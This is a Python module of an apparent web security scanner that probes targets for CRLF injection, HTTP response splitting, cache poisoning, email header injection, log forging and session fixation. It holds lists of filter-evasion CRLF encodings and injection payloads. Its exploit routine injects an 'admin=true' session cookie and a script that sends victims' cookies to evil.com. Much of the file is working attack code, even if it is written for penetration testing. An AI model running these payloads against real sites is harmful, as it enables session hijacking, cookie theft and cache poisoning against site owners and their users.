import re
import asyncio
from urllib.parse import urlparse, urljoin, quote
from modules.base import BaseModule
from core.utils import extract_params, random_string


class CrlfModule(BaseModule):
    name = "crlf"
    description = "CRLF Injection / HTTP Response Splitting Scanner"
    exploitable = True
    
    crlf_sequences = [
        ("%0d%0a", "URL encoded CRLF"),
        ("%0a", "URL encoded LF"),
        ("%0d", "URL encoded CR"),
        ("\r\n", "Raw CRLF"),
        ("\n", "Raw LF"),
        ("\r", "Raw CR"),
        ("%E5%98%8A%E5%98%8D", "Unicode CRLF (UTF-8)"),
        ("%c0%0d%c0%0a", "Overlong UTF-8 CRLF"),
        ("%250d%250a", "Double URL encoded"),
        ("%%0d0d%%0a0a", "Double percent encoded"),
        ("%25%30%64%25%30%61", "Triple encoded"),
        ("%u000d%u000a", "Unicode escape"),
        ("%0d%20%0a", "CRLF with space"),
        ("%0d%09%0a", "CRLF with tab"),
        ("%e5%98%8a%e5%98%8d", "UTF-8 lowercase"),
        ("\u560d\u560a", "Unicode chars"),
        ("%c4%8d%c4%8a", "UTF-8 variant"),
    ]
    
    header_injection_targets = [
        ("Set-Cookie", "lantern_crlf={marker}; Path=/; HttpOnly"),
        ("X-Injected", "{marker}"),
        ("X-Custom-Header", "LANTERN-{marker}"),
        ("Location", "https://evil.com/{marker}"),
        ("Content-Type", "text/html"),
        ("X-XSS-Protection", "0"),
        ("Access-Control-Allow-Origin", "*"),
    ]
    
    cache_poisoning_headers = [
        "X-Forwarded-Host",
        "X-Forwarded-Server", 
        "X-Original-URL",
        "X-Rewrite-URL",
        "X-Host",
        "X-Forwarded-Scheme",
        "X-Original-Host",
        "Forwarded",
    ]
    
    response_splitting_payloads = [
        "{crlf}{crlf}<html><script>alert('LANTERN-{marker}')</script></html>",
        "{crlf}Content-Length: 0{crlf}{crlf}HTTP/1.1 200 OK{crlf}Content-Type: text/html{crlf}{crlf}<script>alert(1)</script>",
        "{crlf}Content-Type: text/html{crlf}{crlf}<img src=x onerror=alert('{marker}')>",
        "{crlf}Transfer-Encoding: chunked{crlf}{crlf}0{crlf}{crlf}",
    ]
    
    log_injection_payloads = [
        "{crlf}FAKE LOG ENTRY: Admin login successful from 127.0.0.1",
        "{crlf}[ERROR] SQL Injection detected - blocking IP",
        "{crlf}User-Agent: Mozilla/5.0{crlf}X-Forwarded-For: 127.0.0.1",
    ]
    
    async def scan(self, target):
        self.findings = []
        self.confirmed_injections = []
        self.oob_manager = self.config.get("oob_manager")
        params = extract_params(target)
        
        if params:
            await self._test_param_injection(target, params)
        
        await self._test_header_injection(target)
        await self._test_path_injection(target)
        await self._test_cache_poisoning(target)
        await self._test_response_splitting(target, params)
        
        if self.oob_manager:
            await self._test_blind_crlf(target, params)
        
        if self.aggressive:
            await self._test_email_header_injection(target)
            await self._test_log_injection(target, params)
            await self._test_session_fixation(target, params)
        
        return self.findings
    
    def _build_payload(self, crlf_seq, header_name, header_value, marker):
        value = header_value.replace("{marker}", marker)
        return f"{crlf_seq}{header_name}: {value}"
    
    async def _test_param_injection(self, target, params):
        marker = random_string(8)
        file_payloads = self.get_payloads("crlf") or []
        
        for param in params:
            for crlf_seq, crlf_name in self.crlf_sequences[:12]:
                for header_name, header_value in self.header_injection_targets[:4]:
                    payload = self._build_payload(crlf_seq, header_name, header_value, marker)
                    full_payload = f"test{payload}"
                    
                    resp = await self.test_param(target, param, full_payload)
                    
                    if not resp.get("status"):
                        continue
                    
                    headers = resp.get("headers", {})
                    headers_lower = {k.lower(): v for k, v in headers.items()}
                    text = resp.get("text", "")
                    
                    if header_name.lower() == "set-cookie":
                        cookie_value = headers_lower.get("set-cookie", "")
                        if f"lantern_crlf={marker}" in cookie_value:
                            verified = await self._verify_cookie_injection(target, marker)
                            
                            self.add_finding(
                                "CRITICAL" if verified else "HIGH",
                                f"CRLF Cookie Injection {'VERIFIED' if verified else 'Detected'}",
                                url=target,
                                parameter=param,
                                evidence=f"Injected cookie: lantern_crlf={marker}, Method: {crlf_name}",
                                confidence_evidence=["cookie_injected", "header_manipulation"] + (["cookie_verified"] if verified else []),
                                request_data={"method": "GET", "url": target, "param": param, "payload": payload}
                            )
                            self.confirmed_injections.append({"type": "cookie", "param": param, "crlf": crlf_seq})
                            self.record_success(payload, target)
                            return
                    
                    elif header_name.lower() in headers_lower:
                        if marker in str(headers_lower.get(header_name.lower(), "")):
                            self.add_finding(
                                "HIGH",
                                f"CRLF Header Injection ({header_name})",
                                url=target,
                                parameter=param,
                                evidence=f"Header: {header_name}, Method: {crlf_name}",
                                confidence_evidence=["header_injected", "crlf_confirmed"],
                                request_data={"method": "GET", "url": target, "param": param, "payload": payload}
                            )
                            self.confirmed_injections.append({"type": "header", "param": param, "header": header_name})
                            self.record_success(payload, target)
                            return
                    
                    if self._detect_response_splitting(text, marker):
                        self.add_finding(
                            "CRITICAL",
                            "HTTP Response Splitting",
                            url=target,
                            parameter=param,
                            evidence=f"Response body injection via {crlf_name}",
                            confidence_evidence=["response_splitting", "xss_possible"],
                            request_data={"method": "GET", "url": target, "param": param, "payload": payload}
                        )
                        self.confirmed_injections.append({"type": "splitting", "param": param})
                        return
            
            for fp in file_payloads[:10]:
                resp = await self.test_param(target, param, f"test{fp}")
                if resp.get("status"):
                    headers = resp.get("headers", {})
                    if any(h.lower() in ["x-injected", "x-custom-header"] for h in headers):
                        self.add_finding(
                            "HIGH",
                            "CRLF Injection (payload file)",
                            url=target,
                            parameter=param,
                            evidence=f"Payload from file succeeded"
                        )
                        return
    
    async def _verify_cookie_injection(self, target, marker):
        resp = await self.http.get(target, headers={"Cookie": f"lantern_crlf={marker}"})
        if resp.get("status"):
            text = resp.get("text", "")
            if marker in text:
                return True
        
        session_resp = await self.http.get(target)
        if session_resp.get("status"):
            cookies = session_resp.get("headers", {}).get("Set-Cookie", "")
            if f"lantern_crlf={marker}" in cookies:
                return True
        return False
    
    async def _test_header_injection(self, target):
        marker = random_string(8)
        
        injectable_headers = [
            "X-Forwarded-Host",
            "X-Original-URL",
            "X-Rewrite-URL",
            "Host",
            "X-Forwarded-For",
            "Referer",
            "User-Agent",
            "X-Custom-IP-Authorization",
            "X-Client-IP",
            "True-Client-IP",
        ]
        
        for header in injectable_headers:
            for crlf_seq, crlf_name in self.crlf_sequences[:8]:
                payload = f"localhost{crlf_seq}X-Injected: {marker}"
                
                resp = await self.http.get(target, headers={header: payload})
                
                if resp.get("status"):
                    resp_headers = {k.lower(): v for k, v in resp.get("headers", {}).items()}
                    
                    if "x-injected" in resp_headers and marker in resp_headers.get("x-injected", ""):
                        self.add_finding(
                            "HIGH",
                            f"CRLF Injection via {header} header",
                            url=target,
                            parameter=header,
                            evidence=f"Method: {crlf_name}, Injected X-Injected header",
                            confidence_evidence=["header_injection", "request_header_vulnerable"],
                            request_data={"method": "GET", "url": target, "header": header, "payload": payload}
                        )
                        self.confirmed_injections.append({"type": "request_header", "header": header})
                        return
                    
                    if marker in resp.get("text", ""):
                        self.add_finding(
                            "MEDIUM",
                            f"CRLF Reflection via {header} header",
                            url=target,
                            parameter=header,
                            evidence=f"Marker reflected in response body"
                        )
    
    async def _test_path_injection(self, target):
        parsed = urlparse(target)
        base = f"{parsed.scheme}://{parsed.netloc}"
        marker = random_string(8)
        
        path_templates = [
            "/{payload}",
            "/test{payload}",
            "/api{payload}",
            "/page{payload}/index",
            "/{payload}/../../",
        ]
        
        for template in path_templates:
            for crlf_seq, crlf_name in self.crlf_sequences[:8]:
                payload = f"{crlf_seq}X-Injected: {marker}"
                test_path = template.replace("{payload}", quote(payload, safe=''))
                test_url = f"{base}{test_path}"
                
                resp = await self.http.get(test_url)
                
                if resp.get("status"):
                    resp_headers = {k.lower(): v for k, v in resp.get("headers", {}).items()}
                    
                    if "x-injected" in resp_headers:
                        self.add_finding(
                            "HIGH",
                            "CRLF Injection in URL path",
                            url=test_url,
                            evidence=f"Path injection via {crlf_name}",
                            confidence_evidence=["path_injection", "crlf_confirmed"],
                            request_data={"method": "GET", "url": test_url}
                        )
                        return
    
    async def _test_cache_poisoning(self, target):
        marker = random_string(8)
        cache_buster = random_string(6)
        
        test_url = f"{target}{'&' if '?' in target else '?'}cb={cache_buster}"
        
        for header in self.cache_poisoning_headers:
            for crlf_seq, crlf_name in self.crlf_sequences[:6]:
                poison_payload = f"evil.com{crlf_seq}X-Cache-Poisoned: {marker}"
                
                resp1 = await self.http.get(test_url, headers={header: poison_payload})
                
                if not resp1.get("status"):
                    continue
                
                await asyncio.sleep(0.5)
                
                resp2 = await self.http.get(test_url)
                
                if resp2.get("status"):
                    headers2 = {k.lower(): v for k, v in resp2.get("headers", {}).items()}
                    
                    if "x-cache-poisoned" in headers2 or marker in resp2.get("text", ""):
                        self.add_finding(
                            "CRITICAL",
                            f"Cache Poisoning via CRLF ({header})",
                            url=target,
                            parameter=header,
                            evidence=f"Poisoned header persisted in cache, Method: {crlf_name}",
                            confidence_evidence=["cache_poisoning", "crlf_confirmed", "persistent_injection"],
                            request_data={"method": "GET", "url": test_url, "header": header}
                        )
                        self.confirmed_injections.append({"type": "cache_poison", "header": header})
                        return
    
    async def _test_response_splitting(self, target, params):
        marker = random_string(8)
        
        if not params:
            return
        
        for param in list(params)[:3]:
            for crlf_seq, crlf_name in self.crlf_sequences[:6]:
                for split_template in self.response_splitting_payloads[:3]:
                    payload = split_template.replace("{crlf}", crlf_seq).replace("{marker}", marker)
                    
                    resp = await self.test_param(target, param, f"test{payload}")
                    
                    if resp.get("status"):
                        text = resp.get("text", "")
                        
                        if f"alert('LANTERN-{marker}')" in text or f"alert('{marker}')" in text:
                            self.add_finding(
                                "CRITICAL",
                                "HTTP Response Splitting - XSS Achieved",
                                url=target,
                                parameter=param,
                                evidence=f"Full response split with XSS payload, Method: {crlf_name}",
                                confidence_evidence=["response_splitting", "xss_confirmed", "critical_impact"],
                                request_data={"method": "GET", "url": target, "param": param, "payload": payload[:100]}
                            )
                            return
                        
                        if "HTTP/1.1 200" in text and crlf_seq not in ["\r\n", "\n", "\r"]:
                            self.add_finding(
                                "HIGH",
                                "HTTP Response Splitting Detected",
                                url=target,
                                parameter=param,
                                evidence=f"Response contains injected HTTP response",
                                confidence_evidence=["response_splitting"],
                                request_data={"method": "GET", "url": target, "param": param}
                            )
                            return
    
    async def _test_blind_crlf(self, target, params):
        token = self.oob_manager.generate_token()
        callback_url = self.oob_manager.get_http_url(token)
        
        for crlf_seq, crlf_name in self.crlf_sequences[:6]:
            payload = f"{crlf_seq}X-Callback: {callback_url}{crlf_seq}Location: {callback_url}"
            
            if params:
                for param in list(params)[:2]:
                    await self.test_param(target, param, f"test{payload}")
            
            for header in self.cache_poisoning_headers[:3]:
                await self.http.get(target, headers={header: f"localhost{payload}"})
        
        await asyncio.sleep(3)
        
        interactions = self.oob_manager.check_interactions(token)
        if interactions:
            self.add_finding(
                "CRITICAL",
                "Blind CRLF Injection Confirmed via OOB",
                url=target,
                evidence=f"Received {len(interactions)} callback(s)",
                confidence_evidence=["oob_callback", "blind_crlf_confirmed"],
                request_data={"method": "GET", "url": target, "callback": callback_url}
            )
    
    async def _test_email_header_injection(self, target):
        parsed = urlparse(target)
        base = f"{parsed.scheme}://{parsed.netloc}"
        
        email_endpoints = [
            "/contact", "/feedback", "/support", "/email", "/send",
            "/api/contact", "/api/email", "/api/feedback",
        ]
        
        marker = random_string(8)
        
        for endpoint in email_endpoints:
            url = urljoin(base, endpoint)
            
            resp = await self.http.get(url)
            if resp.get("status") not in [200, 302]:
                continue
            
            email_payloads = [
                {"email": f"test@test.com%0d%0aBcc: attacker@evil.com", "message": "test"},
                {"email": f"test@test.com\r\nBcc: attacker@evil.com", "message": "test"},
                {"to": f"test@test.com%0d%0aCc: attacker-{marker}@evil.com", "body": "test"},
                {"subject": f"Test%0d%0aBcc: attacker@evil.com", "email": "test@test.com"},
            ]
            
            for payload in email_payloads:
                resp = await self.http.post(url, data=payload)
                
                if resp.get("status") in [200, 302]:
                    text = resp.get("text", "").lower()
                    if "sent" in text or "success" in text or "thank" in text:
                        if "error" not in text and "invalid" not in text:
                            self.add_finding(
                                "HIGH",
                                "Email Header Injection Possible",
                                url=url,
                                evidence="Contact form may allow email header injection",
                                confidence_evidence=["email_injection_vector"],
                                request_data={"method": "POST", "url": url, "payload": str(payload)[:100]}
                            )
                            return
    
    async def _test_log_injection(self, target, params):
        if not params:
            return
        
        marker = random_string(8)
        
        for param in list(params)[:2]:
            for crlf_seq, crlf_name in self.crlf_sequences[:4]:
                for log_payload in self.log_injection_payloads:
                    payload = log_payload.replace("{crlf}", crlf_seq).replace("{marker}", marker)
                    
                    resp = await self.test_param(target, param, payload)
                    
                    if resp.get("status") == 200:
                        self.add_finding(
                            "MEDIUM",
                            "Potential Log Injection via CRLF",
                            url=target,
                            parameter=param,
                            evidence=f"Log injection payload accepted, Method: {crlf_name}",
                            confidence_evidence=["log_injection_vector"]
                        )
                        return
    
    async def _test_session_fixation(self, target, params):
        if not params:
            return
        
        fixed_session = f"FIXATED_{random_string(16)}"
        
        for param in list(params)[:2]:
            for crlf_seq, crlf_name in self.crlf_sequences[:4]:
                payload = f"{crlf_seq}Set-Cookie: PHPSESSID={fixed_session}; Path=/"
                
                resp1 = await self.test_param(target, param, f"test{payload}")
                
                if resp1.get("status"):
                    cookies = resp1.get("headers", {}).get("Set-Cookie", "")
                    if fixed_session in cookies:
                        resp2 = await self.http.get(target, headers={"Cookie": f"PHPSESSID={fixed_session}"})
                        
                        if resp2.get("status") == 200:
                            self.add_finding(
                                "CRITICAL",
                                "Session Fixation via CRLF",
                                url=target,
                                parameter=param,
                                evidence=f"Fixed session ID accepted: {fixed_session[:20]}...",
                                confidence_evidence=["session_fixation", "crlf_confirmed", "auth_bypass_risk"],
                                request_data={"method": "GET", "url": target, "param": param}
                            )
                            return
    
    def _detect_response_splitting(self, text, marker):
        patterns = [
            re.compile(rf'Set-Cookie:\s*lantern_crlf={re.escape(marker)}', re.IGNORECASE),
            re.compile(rf'X-Injected:\s*{re.escape(marker)}', re.IGNORECASE),
            re.compile(r'<script>alert\([\'"]?LANTERN', re.IGNORECASE),
            re.compile(r'HTTP/\d\.\d\s+200\s+OK.*Content-Type:', re.DOTALL),
            re.compile(r'\r\n\r\n.*<script>', re.DOTALL),
        ]
        for pattern in patterns:
            if pattern.search(text):
                return True
        return False
    
    async def exploit(self, target, finding):
        extracted = {
            "injection_type": None,
            "exploits_demonstrated": [],
            "session_hijack_possible": False,
            "cache_poison_possible": False,
        }
        
        param = finding.get("parameter")
        if not param:
            return None
        
        for injection in self.confirmed_injections:
            if injection.get("type") == "cookie":
                extracted["injection_type"] = "cookie"
                
                hijack_cookie = f"session={random_string(32)}; admin=true"
                for crlf_seq, _ in self.crlf_sequences[:3]:
                    payload = f"{crlf_seq}Set-Cookie: {hijack_cookie}"
                    resp = await self.test_param(target, param, f"test{payload}")
                    
                    if resp.get("status"):
                        cookies = resp.get("headers", {}).get("Set-Cookie", "")
                        if "admin=true" in cookies:
                            extracted["session_hijack_possible"] = True
                            extracted["exploits_demonstrated"].append({
                                "type": "session_manipulation",
                                "payload": payload[:80],
                                "result": "Admin cookie injected"
                            })
                            
                            self.add_finding(
                                "CRITICAL",
                                "CRLF EXPLOITED: Session Manipulation",
                                url=target,
                                parameter=param,
                                evidence="Arbitrary cookies can be set on victim browsers"
                            )
                            break
            
            elif injection.get("type") == "cache_poison":
                extracted["injection_type"] = "cache_poison"
                extracted["cache_poison_possible"] = True
                extracted["exploits_demonstrated"].append({
                    "type": "cache_poisoning",
                    "header": injection.get("header"),
                    "result": "Cache can be poisoned with malicious content"
                })
            
            elif injection.get("type") == "splitting":
                extracted["injection_type"] = "response_splitting"
                
                xss_payload = "<script>document.location='https://evil.com/?c='+document.cookie</script>"
                for crlf_seq, _ in self.crlf_sequences[:3]:
                    split_payload = f"{crlf_seq}{crlf_seq}{xss_payload}"
                    resp = await self.test_param(target, param, f"test{split_payload}")
                    
                    if resp.get("status") and xss_payload in resp.get("text", ""):
                        extracted["exploits_demonstrated"].append({
                            "type": "xss_via_splitting",
                            "payload": split_payload[:80],
                            "result": "XSS achieved through response splitting"
                        })
                        
                        self.add_finding(
                            "CRITICAL",
                            "CRLF EXPLOITED: XSS via Response Splitting",
                            url=target,
                            parameter=param,
                            evidence="Full XSS payload injected into response"
                        )
                        break
        
        if extracted["exploits_demonstrated"]:
            self.exploited_data = extracted
            return extracted
        
        return None
